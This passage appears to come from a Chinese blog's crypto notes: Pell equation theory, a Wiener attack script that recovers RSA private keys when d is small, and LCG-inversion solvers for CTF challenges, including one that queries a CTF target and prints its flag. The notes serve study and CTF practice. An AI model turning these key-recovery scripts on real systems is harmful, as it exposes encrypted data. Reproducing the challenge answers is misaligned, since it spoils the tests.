display">\[\alpha_n=\frac{\sqrt{d}+P_n}{Q_n},且P_n^2\equiv d\ (mod\ Q_n)\]</span> 成立.</p><h3 id="定理13">定理13：</h3><p>若<span class="math inline">\(d\)</span>是一个非平方的正整数，<span class="math inline">\(Q_n\)</span>为<strong>定理12</strong>中所定义，则二次不定方程<span class="math inline">\(x^2-dy^2=(-1)^nQ_n\)</span>有正整数解<span class="math inline">\(x,y\)</span>且<span class="math inline">\((x,y)=1\)</span>.</p><h3 id="定理14">定理14：</h3><p>若有<span class="math inline">\(\sqrt{d}=[a_1,a_2, \cdots ,a_s,a_{s+1}, \cdots ,a_{s+t}],n&gt;s\)</span>而<span class="math inline">\(Q_n\)</span>为<strong>定理12</strong>所定义，则方程<span class="math inline">\(x^2-dy^2=(-1)^nQ_n\)</span>有无穷多个正整数解 <span class="math inline">\(|{p_{m+lt}}|,q_n+lt,2\ |\ l,l\ge0\)</span> .（其中 <span class="math inline">\(\frac {p_{m+lt}}{q_{m+lt}}\)</span> 为 <span class="math inline">\(\sqrt {d}\)</span> 的第 <span class="math inline">\(m+lt\)</span> 个渐进分数）.</p><p>由<strong>定理14</strong>可知存在一正整数<span class="math inline">\(Q\)</span>（取<span class="math inline">\(Q=(-1)^nQ_n,n&gt;s\)</span>）使得不定方程<span class="math inline">\(x^2-dy^2=Q\)</span>有无穷多组正整数解，则在这些解中必存在两组不同的正整数<span class="math inline">\(x_1y_1;x_2y_2\)</span>使得 <span class="math display">\[x_1\equiv x_2\ (mod\ |{Q}|)\ ,\ y_1\equiv y_2\ (mod\ |{Q}|)\]</span> 成立.由于<span class="math inline">\(x^2_1-dy^2_1=x^2_2-dy^2_2=Q\)</span>，故有 <span class="math display">\[Q^2=(x_1^2-dy_1^2)(x_2^2-dy_2^2)=(x_1x_2-dy_1y_2)^2-d(x_1y_2-x_2y_1)^2\]</span> 由<span class="math inline">\(x_1\equiv x_2\ (mod\ |{Q}|)\ ,\ y_1\equiv y_2\ (mod\ |{Q}|)\)</span>可得： <span class="math display">\[x_1x_2-dy_1y_2\equiv x_1^2-dy_1^2\equiv 0\ (mod\ |{Q}|),\\ x_1y_2-x_2y_1\equiv x_1y_1-x_1y_1\equiv 0\ (mod\ |{Q}|)\]</span> 故若令<span class="math inline">\(|{\frac{x_1x_2-dy_1y_2}{Q}}|=x,|{\frac{x_1y_2-x_2y_1}{Q}}|=y\)</span>，可知<span class="math inline">\(x,y\)</span>均为非负整数且为方程<span class="math inline">\(x^2-dy^2=1\)</span>的一解.</p><p>显然有<span class="math inline">\(x\neq0\)</span>，否则有<span class="math inline">\(-dy^{2}=1\)</span>，与<span class="math inline">\(d&gt;0\)</span>矛盾；且有<span class="math inline">\(y\neq0\)</span>否则有<span class="math inline">\(x_1y_2-x_2y_1=0\)</span>，由引理2知<span class="math inline">\((x_1,y_1)=(x_2,y_2)=1\)</span>，所以有<span class="math inline">\(x_1\ |\ x_2,x_2\ |\ x_1\)</span>，由于<span class="math inline">\(x_1,x_2\)</span>均为正整数，所以有<span class="math inline">\(x_1=x_2,y_1=y_2\)</span>，与<span class="math inline">\(x_1,y_1;x_2;y_n\)</span>不同的定义相悖.故可知<span class="math inline">\(x,y\)</span>为方程<span class="math inline">\(x^2-dy^2=1\)</span>的一组正整数解.</p><p>综上所述，当<span class="math inline">\(d\)</span>为完全平方数时，不定方程<span class="math inline">\(x^2-dy^2=1\)</span>有正整数解.</p><h4 id="现在求不定方程x2-dy21的正整数解">现在求不定方程<span class="math inline">\(x^2-dy^2=1\)</span>的正整数解：</h4><h3 id="定理15">定理15：</h3><p>若<span class="math inline">\(x_0,y_0\)</span>是方程<span class="math inline">\(x^2-dy^2=1\)</span>的一组正整数解，且<span class="math inline">\(x_0+\sqrt{d}y_0\)</span>是形如<span class="math inline">\(x+\sqrt{d}y\)</span>（<span class="math inline">\(x,y\)</span>是方程<span class="math inline">\(x^2-dy^2=1\)</span>的正整数解）的最小数，则方程<span class="math inline">\(x^2-dy^2=1\)</span>的一切正整数解<span class="math inline">\(x,y\)</span>可以由 <span class="math display">\[x\pm\sqrt{d}y=\big(x_0+\sqrt{d}y_0\big)^n,n=1,2,\cdots\]</span> 确定.</p><p>有了<strong>定理15</strong>，我们可以通过一个佩尔方程的最小正整数解求出这个佩尔方程的所有解.现在我们的目标就成为找到如何求佩尔方程的最小正整数解.</p><p>实际上，对于不为完全平方数的<span class="math inline">\(\sqrt{d}=[a_1,a_2,\cdots,a_n,\cdots]\)</span>我们总能找到<span class="math inline">\(a_{n+1}\)</span>满足<span class="math inline">\(a_i=2a_1(i=2,3,\cdots,n)\)</span>，则<span class="math inline">\(\frac{x}{y}=[a_1,a_2,\cdots,a_{n}]\)</span>可能为<span class="math inline">\(d\)</span>定义的佩尔方程的一组解.</p><p>求佩尔方程最小整数解的代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span>*</span><br><span class="line">d = ...</span><br><span class="line">cf = continued_fraction(sqrt(d))</span><br><span class="line">a0 = cf[<span class="number">0</span>]</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> cf[i] == <span class="number">2</span>*a0:</span><br><span class="line">        c = cf.convergent(i-<span class="number">1</span>)</span><br><span class="line">        x, y = c.as_integer_ratio()</span><br><span class="line">        <span class="keyword">if</span> x**<span class="number">2</span> - d*y**<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>((x,y))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>在这里扩展地提一下广义佩尔方程：</p><h4 id="定义-1">定义</h4><p>形如<span class="math inline">\(x^2-dy^2=c\)</span>的方程称为广义佩尔方程.</p><h4 id="求解">求解</h4><p>通过连分数求出广义佩尔方程的最小正整数解<span class="math inline">\((x_0,y_0)\)</span>后，可以知道<span class="math inline">\((x_0r+Dy_0s,x_0s+y_0r)\)</span>也是该方程的整数解（其中<span class="math inline">\(r,s\)</span>为方程<span class="math inline">\(r^2-ds^2=1\)</span>的整数解）</p><h4 id="求解代码">求解代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pell_roots</span>(<span class="params">D: <span class="built_in">int</span>, C: <span class="built_in">int</span> = <span class="number">1</span></span>):</span><br><span class="line">    intervals = <span class="number">2</span>**<span class="number">10</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_a_root</span>(<span class="params">D: <span class="built_in">int</span>, C: <span class="built_in">int</span></span>):</span><br><span class="line">        cf = continued_fraction(sqrt(D))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, intervals):</span><br><span class="line">            c = cf.convergent(i - <span class="number">1</span>)</span><br><span class="line">            x, y = c.as_integer_ratio()</span><br><span class="line">            <span class="keyword">if</span> x**<span class="number">2</span> - D * y**<span class="number">2</span> == C:</span><br><span class="line">                <span class="keyword">return</span> x, y</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, intervals):</span><br><span class="line">            x2 = C + D * y**<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> x2 &lt;= <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            x = isqrt(x2)</span><br><span class="line">            <span class="keyword">if</span> x ** <span class="number">2</span> == x2:</span><br><span class="line">                <span class="keyword">return</span> x, y</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span> </span><br><span class="line">    r, s = get_a_root(D, <span class="number">1</span>)</span><br><span class="line">    x, y = get_a_root(D, C)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> x, y</span><br><span class="line">        x, y = x * r + D * y * s, r * y + s * x</span><br><span class="line">D = ...</span><br><span class="line">C = ...</span><br><span class="line">x, y = <span class="built_in">next</span>(pell_roots(D, C))</span><br><span class="line"><span class="built_in">print</span>(x**<span class="number">2</span> - D * y**<span class="number">2</span> == C)</span><br><span class="line"><span class="built_in">print</span>((x,y))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="rsa的维纳攻击">RSA的维纳攻击</h3><h4 id="原理">原理</h4><p>考虑一般的RSA，<span class="math inline">\(c\equiv m^e\ (mod\ n),n=pq\)</span>，<span class="math inline">\(p,q\)</span>均为质数，在这里<span class="math inline">\(e\)</span>非常大，这也是适用维纳攻击的RSA的明显特征，有<span class="math inline">\(\varphi(n)=(p-1)(q-1)\)</span>，则有 <span class="math display">\[\varphi(n)=(p-1)(q-1)=pq-p-q+1=N-p-\frac{n}{p}+1\]</span> 故有<span class="math inline">\(p^2+p\big[\varphi(n)-n-1\big]+n=0\)</span></p><p>故若我们已知<span class="math inline">\(n\)</span>和<span class="math inline">\(\varphi(n)\)</span>，我们就可以对<span class="math inline">\(n\)</span>进行分解.</p><p>又由于在RSA中，有<span class="math inline">\(ed\equiv1\ (mod\ \varphi(n))\)</span>，所以存在整数<span class="math inline">\(k\)</span>使得<span class="math inline">\(ed=k\varphi(n)+1\)</span></p><p>即有 <span class="math display">\[|{\frac{e}{\varphi(n)}-\frac{k}{d}}|=\frac{1}{d\varphi(n)}\]</span> 由<strong>定理11（Legendre定理）</strong>可知：<span class="math inline">\(\frac{k}{d}\)</span>是<span class="math inline">\(\frac{e}{\varphi(n)}\)</span>的一个有理近似，故我们可以通过<span class="math inline">\(\frac{e}{\varphi(n)}\)</span>的有理近似获得<span class="math inline">\(\frac{k}{d}\)</span>，当<span class="math inline">\(n=pq\)</span>且<span class="math inline">\(q&lt;p&lt;2q\)</span>时，若满足<span class="math inline">\(d&lt;\frac{1}{3}n^\frac{1}{4}\)</span>，则<span class="math inline">\(\frac{k}{d}\)</span>为<span class="math inline">\(\frac{e}{n}\)</span>的一个有理近似.</p><h4 id="求解步骤">求解步骤</h4><p>(1)估测是否满足<span class="math inline">\(d&lt;\frac{1}{3}n^\frac{1}{4}\)</span></p><p>(2)求<span class="math inline">\(\frac{e}{n}\)</span>的连分数展开</p><p>(3)迭代连分数<span class="math inline">\(\frac{k_i}{d_i}\)</span>：先使用<span class="math inline">\(k_i,d_i\)</span>求出<span class="math inline">\(\varphi_i(n)\)</span>，再通过<span class="math inline">\(\varphi_i(n)\)</span>计算出<span class="math inline">\(n\)</span>，验证<span class="math inline">\(\varphi_i(n)\)</span>是否正确</p><h4 id="解密脚本">解密脚本：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">n, e</span>):</span><br><span class="line">    cf = continued_fraction(e / n)</span><br><span class="line">    convers = cf.convergents()</span><br><span class="line">    <span class="keyword">for</span> pkd <span class="keyword">in</span> convers:</span><br><span class="line">        pk, pd = pkd.as_integer_ratio()</span><br><span class="line">        <span class="keyword">if</span> pk == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * pd - <span class="number">1</span>) % pk != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        pphi = (e * pd - <span class="number">1</span>) // pk</span><br><span class="line">        p = var(<span class="string">&#x27;p&#x27;</span>, domain=ZZ)</span><br><span class="line">        roots = solve(p ** <span class="number">2</span> + (pphi - n - <span class="number">1</span>) * p + n, p)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(roots) == <span class="number">2</span>:</span><br><span class="line">            pp, pq = roots</span><br><span class="line">            <span class="keyword">if</span> pp * pq == n:</span><br><span class="line">                <span class="keyword">return</span> pp, pq, pd</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line">n = ...</span><br><span class="line">e = ...</span><br><span class="line">c = ...</span><br><span class="line">p, q, d = wienerAttack(n, e)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数论笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> 数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LCG笔记</title>
      <link href="/2023/12/17/LCG%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/12/17/LCG%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>LCG，全称线性同余方发生器（Linear congruential generator），是一种伪随机序列生成器算法，生成器由下式定义： <span class="math display">\[X_{n+1}\equiv aX_n+b\ (mod\ p)\]</span> 在CTF中，一般有以下题型：</p><h2 id="一.求逆">一.求逆</h2><p>所谓求逆，其实即为已知a,b,p,c后求解方程： <span class="math display">\[c\equiv(ax+b)\ (mod\ p)\]</span> 由数论知识我们很容易可以知道： <span class="math display">\[x\equiv(c-b)a^{-1}\ (mod\ p)\]</span> 对于这类题目，我们只需利用以上公式即可快速解出。</p><h2 id="二.求参数ab后求逆">二.求参数a,b后求逆</h2><p>这类题型一般都会给出一列连续经过几次线性同余的数据后得出的数据和p，我们需要通过这些有限的数据来求解原来的数据，在此之前我们需要先求解a和b，大致过程如下：</p><p>假设已知<span class="math display">\[x_{n},x_{n+1},x_{n+2}\]</span>，我们有：</p><p><span class="math display">\[x_{n+1}\equiv ax_n+b\ (mod\ p)\\ x_{n+2}\equiv ax_{n+1}+b\ (mod\ p)\]</span> 所以我们有： <span class="math display">\[x_{n+2}-x_{n+1}\equiv a(x_{n+1}-x_n)\ (mod\ p)\]</span> 所以： <span class="math display">\[a\equiv (x_{n+2}-x_{n+1})(x_{n+1}-x_n)^{-1}\ (mod\ p)(假定(x_{n+1}-x_n)与p互质)\]</span> 那么我们有： <span class="math display">\[b\equiv x_{n+1}-ax_n\ (mod\ p)\]</span> 这样我们就可以得到a,b，再通过求逆得出原来的数据即可。</p><h3 id="例newstar-ctf2023week3-babyrandom">例：[Newstar CTF2023]Week3 babyrandom</h3><p>加密代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line">p = <span class="number">64999433139797068147576269731948390094958654326970231465808792590598519729077</span></span><br><span class="line"></span><br><span class="line">a = randrange(<span class="number">2</span>, p)</span><br><span class="line">b = randrange(<span class="number">2</span>, p)</span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line">menu = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Random as a Service with LCG backend</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enter your option</span></span><br><span class="line"><span class="string">1. Reset</span></span><br><span class="line"><span class="string">2. Get</span></span><br><span class="line"><span class="string">3. Exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetRandom</span>():</span><br><span class="line">    <span class="keyword">global</span> x</span><br><span class="line">    nx = (a*x + b) % p</span><br><span class="line">    <span class="built_in">print</span>(nx)</span><br><span class="line">    x = nx</span><br><span class="line">    </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(menu)</span><br><span class="line">    opt = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opt = <span class="built_in">int</span>(opt)</span><br><span class="line">        <span class="keyword">if</span> opt == <span class="number">1</span>:</span><br><span class="line">            x = bytes_to_long(flag)</span><br><span class="line">        <span class="keyword">elif</span> opt == <span class="number">2</span>:</span><br><span class="line">            GetRandom()</span><br><span class="line">        <span class="keyword">elif</span> opt == <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;invalid option&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;oh no, something wrong!&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>这道题提供了靶机，可以通过靶机得出三个连续加密后数据，解密代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">x = []</span><br><span class="line">p = <span class="number">64999433139797068147576269731948390094958654326970231465808792590598519729077</span></span><br><span class="line">io = pwn.remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25624</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    data = io.recvline()</span><br><span class="line">    io.recv()</span><br><span class="line">    x.append(<span class="built_in">int</span>(data))</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">a = (x[<span class="number">2</span>]-x[<span class="number">1</span>])*gmpy2.invert(x[<span class="number">1</span>]-x[<span class="number">0</span>],p)%p</span><br><span class="line">b = (x[<span class="number">1</span>]-a*x[<span class="number">0</span>])%p</span><br><span class="line">x = (x[<span class="number">0</span>]-b)*gmpy2.invert(a,p)%p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(x))</span><br></pre></td></tr></table></figure><p>运行可得flag：</p><blockquote><p>flag{lcg_1s_n0t_s3cur3#fb528ba5}</p></blockquote><h2 id="三.求参数abp后求逆">三.求参数a,b,p后求逆</h2><p>与上一种形式相似，但是多了个p要求，我们假设一个数列： <span class="math display">\[\{x_0,x_1,x_2,\cdots,x_{n-1},x_{n},\cdots\}\]</span> 其满足： <span class="math display">\[x_{n+1}\equiv ax_n+b\ (mod\ p)\]</span> 假设有一个数列 <span class="math display">\[\{t_n\}\]</span> 有：</p><p><span class="math display">\[t_n\equiv x_{n+1}-x_n\equiv a(x_n-x_{n-1})\equiv at_{n-1}\ (mod\ p)\]</span></p><p>所以：</p><p><span class="math display">\[t_{n+1}t_{n-1}\equiv a^{2}t_{n-1}^2\equiv t_n^2\ (mod\ p)\]</span></p><p>也就是说：</p><p><span class="math display">\[t_{n+1}t_{n-1}-t_n^{2}=kp\ (k\in Z)\]</span></p><p>同理，有：</p><p><span class="math display">\[t_{n+2}t_{n}-t_{n+1}^{2}=k&#39;p\ (k&#39;\in Z)\]</span></p><p>所以：</p><p><span class="math display">\[p=gcd(t_{n+2}t_{n}-t_{n+1}^{2},t_{n+1}t_{n-1}-t_n^{2})\]</span> 求出p后我们就可以由上种类型继续求解。</p><p>但是要注意，上面求出的p不一定就是实际要求的p，所以需要综合多组数据求解。</p><h3 id="例pctf2023cgl">例：[PCTF2023]cgl</h3><p>加密代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag,hint,key_number</span><br><span class="line"></span><br><span class="line">hint=bytes_to_long(hint)</span><br><span class="line"></span><br><span class="line">a = getPrime(<span class="number">256</span>)</span><br><span class="line">b = getPrime(<span class="number">256</span>)</span><br><span class="line">n = getPrime(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">state = hint</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    state = (state * a + b) % n</span><br><span class="line">    result.append(state)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc=<span class="built_in">list</span>(base64.b64encode(flag))</span><br><span class="line">seed(key_number)</span><br><span class="line">shuffle(enc)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(enc))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[64808739969023370119048821688797617211776674130654821075486774236651303382814, </span></span><br><span class="line"><span class="string">79259085906502785899793009961165414442137337544515472474317826031734962148580, </span></span><br><span class="line"><span class="string">47572752582229256276978761367590954300620113464013293239765792280017260371290, </span></span><br><span class="line"><span class="string">38491979589561565391093783861378040494484383004914878495301417593240442882761, </span></span><br><span class="line"><span class="string">58955289126482266943455593731576872529828229203595014577711629479455475819111]</span></span><br><span class="line"><span class="string">b&#x27;QkiTMMx3St9IYTLMN2DmR0t53zd1MhmJT1hZ2YiwMZETVhwhOGYVZYcD&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题很明显要通过上述方法来求解hint，在这里我们只求解hint，求解代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">x = [<span class="number">64808739969023370119048821688797617211776674130654821075486774236651303382814</span>, </span><br><span class="line"><span class="number">79259085906502785899793009961165414442137337544515472474317826031734962148580</span>, </span><br><span class="line"><span class="number">47572752582229256276978761367590954300620113464013293239765792280017260371290</span>, </span><br><span class="line"><span class="number">38491979589561565391093783861378040494484383004914878495301417593240442882761</span>, </span><br><span class="line"><span class="number">58955289126482266943455593731576872529828229203595014577711629479455475819111</span>]</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    t.append(x[i+<span class="number">1</span>]-x[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span>):</span><br><span class="line">    p = gmpy2.gcd(t[i+<span class="number">2</span>]*t[i]-t[i+<span class="number">1</span>]*t[i+<span class="number">1</span>],t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>]-t[i]*t[i])</span><br><span class="line">    a = (x[<span class="number">2</span>]-x[<span class="number">1</span>])*gmpy2.invert(x[<span class="number">1</span>]-x[<span class="number">0</span>],p)%p</span><br><span class="line">    b = (x[<span class="number">1</span>]-a*x[<span class="number">0</span>])%p</span><br><span class="line">    x = (x[<span class="number">0</span>] - b) * gmpy2.invert(a, p) % p</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(x))</span><br></pre></td></tr></table></figure><p>运行可以得出hint：</p><blockquote><p>key_number=randrange(999999)</p></blockquote><p>要注意的是：在这种情况下，<span class="math display">\[\{x_n\}\]</span>的元素数量应该至少要有5个才能求解出p。</p>]]></content>
      
      
      <categories>
          
          <category> 密码学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Anshel–Anshel–Goldfeld 密钥交换体系(Anshel–Anshel–Goldfeld key exchange)</title>
      <link href="/2023/12/15/Anshel%E2%80%93Anshel%E2%80%93Goldfeld-%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E4%BD%93%E7%B3%BB-Anshel%E2%80%93Anshel%E2%80%93Goldfeld-key-exchange/"/>
      <url>/2023/12/15/Anshel%E2%80%93Anshel%E2%80%93Goldfeld-%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E4%BD%93%E7%B3%BB-Anshel%E2%80%93Anshel%E2%80%93Goldfeld-key-exchange/</url>
      
        <content type="html"><![CDATA[<h3 id="原理代数密钥建立协议the-algebraic-key-establishment-protocol">原理（代数密钥建立协议，The algebraic key establishment protocol）</h3><p>​ We now present an algebraic key establishment protocol which, in its most general form consists of a five–tuple <span class="math display">\[(U, V,\beta,\gamma_1, \gamma_2)\]</span> where <span class="math inline">\(U\)</span> and <span class="math inline">\(V\)</span> are feasibly computable monoids, and <span class="math display">\[\beta:U× U\rightarrow V,\ \ \ \gamma_i:U× V\rightarrow V\ \ (i=1,2)\]</span> are feasibly computable functions satisfying the following properties.</p><p>​ (i) For all elements <span class="math inline">\(x, y_1, y_2 \in U\)</span> , <span class="math display">\[\beta(x,y_1\cdot y_2)=\beta(x,y_1)\cdot \beta(x,y_2)\]</span> ​ (ii) For all elements <span class="math inline">\(x, y \in U\)</span> , <span class="math display">\[\gamma_1(x,\beta(y,x))=\gamma_2(x,\beta(x,y))\]</span> ​ (iii) Suppose <span class="math inline">\(y_1, y_2, \cdots ,y_k \in U\)</span> and <span class="math inline">\(\beta(x, y_1), \beta(x, y_2), \cdots ,\beta(x, y_k)\)</span> are publicly known for some secret element <span class="math inline">\(x \in U\)</span>. Then, in general, it is infeasible to determine the secret element <span class="math inline">\(x\)</span> .</p><p>​ The users <span class="math inline">\(A\)</span> and <span class="math inline">\(B\)</span> are publicly assigned submonoids, <span class="math inline">\(S_A, T_B \subseteq U\)</span>, respectively. Suppose that <span class="math inline">\(S_A\)</span> is generated by the elements <span class="math display">\[\{s_1,\cdots ,s_m\}\]</span> and <span class="math inline">\(S_B\)</span> is generated by <span class="math inline">\(\{t_1,\cdots,t_n\}\)</span>.The protocol begins with user A choosing a secret element a in <span class="math inline">\(S_A\)</span> and transmitting the elements <span class="math display">\[\beta(a,t_i)\ \ \ \ \ \ i=1,\cdots,n.\]</span> Likewise, user <span class="math inline">\(B\)</span> chooses a secret element <span class="math inline">\(b\)</span> in <span class="math inline">\(T\)</span>, transmits <span class="math display">\[\beta(b,s_i)\ \ \ \ \ \ i=1,\cdots,m.\]</span> It follows from property (iii) that even though the transmission is over a public channel, the secret elements <span class="math inline">\(a\)</span> and <span class="math inline">\(b\)</span> are secure. Property (i) above insures that user <span class="math inline">\(A\)</span> can compute the element <span class="math display">\[\beta(b,a),\]</span> and <span class="math display">\[\gamma_1(a,\beta(b,a)).\]</span> Likewise user <span class="math inline">\(B\)</span> can compute <span class="math inline">\(\beta(a, b)\)</span> and <span class="math inline">\(\gamma_2(b, \beta(a, b))\)</span>. Recalling property (ii) above we see that <span class="math display">\[\kappa=\gamma_1(a,\beta(b,a))=\gamma_2(b,\beta(a,b))\]</span> can serve as an established key.</p><h3 id="具体例子群论协议a-group-theoretic-protocol">具体例子（群论协议，A group theoretic protocol）</h3><p>In this illustration the monoid <span class="math inline">\(U = V\)</span> is a group, denoted <span class="math inline">\(G\)</span>, and the users <span class="math inline">\(A\)</span> and <span class="math inline">\(B\)</span> are publicly assigned subgroups <span class="math display">\[S_A=\langle s_1,s_2,\cdots ,s_m\rangle,\ \ \ \ S_B=\langle t_1,t_2,\cdots ,t_n\rangle.\]</span> Here the function <span class="math inline">\(\beta:G× G\rightarrow G\)</span> is chosen to be conjugation, <span class="math display">\[\gamma_1(u,v)=u^{-1}v,\ \ \ \ \ \ \gamma_2(u,v)=v^{-1}u.\]</span> Users A and B choose secret elements <span class="math inline">\(a \in S_A\)</span> and <span class="math inline">\(b \in S_B\)</span> respectively, and user <span class="math inline">\(A\)</span> begins the protocol by computing, rewriting, and transmitting the collection of elements <span class="math display">\[a^{-1}t_1a,a^{-1}t_2a,\cdots ,a^{-1}t_na.\]</span> Similarly, user <span class="math inline">\(B\)</span> computes, rewrites, and transmits <span class="math display">\[b^{-1}s_1b,b^{-1}s_2b,\cdots,b^{-1}s_mb.\]</span> An adversary observing these transmissions is unable to determine <span class="math inline">\(a\)</span> or <span class="math inline">\(b\)</span> unless <span class="math inline">\((s)\)</span> he can solve a set of simultaneous conjugacy equations over the base group.</p><p>​ Multiplying two elements in the group can be accomplished by simply concatenating the two expressions representing the elements. The process of rewriting, while not unique, must be chosen so that no adversary can determine the conjugating element from viewing the publicly transmitted conjugates.</p><p>​ Recalling that the conjugate of the product of two elements is the product of the conjugates of those elements (i.e., property (i) of <span class="math inline">\(\beta\)</span>), users <span class="math inline">\(A\)</span> and <span class="math inline">\(B\)</span> are now in a position to compute, respectively, the elements <span class="math display">\[\beta(b,a)=b^{-1}ab,\ \ \ \ \ \ \ \ \beta(a,b)=a^{-1}ba.\]</span> In order to attain a common key, user <span class="math inline">\(A\)</span> computes <span class="math display">\[\kappa=\gamma_1(a,\beta(b,a))=a^{-1}b^{-1}ab=[a,b],\]</span> and user <span class="math inline">\(B\)</span> computes <span class="math display">\[\kappa=\gamma_2(a,\beta(b,a))=[a,b].\]</span> （上文摘自<em>Mathematical Research Letters 6, 287–291 (1999),AN ALGEBRAIC METHOD FOR PUBLIC-KEY CRYPTOGRAPHY</em>,Iris Anshel, Michael Anshel, and Dorian Goldfeld著）</p><h4 id="应用例">应用例</h4><h5 id="utctf2020cube-crypto">[UTCTF2020]Cube Crypto</h5><p>Mr. Anshel and Mr. Goldfeld were trying to exchange some 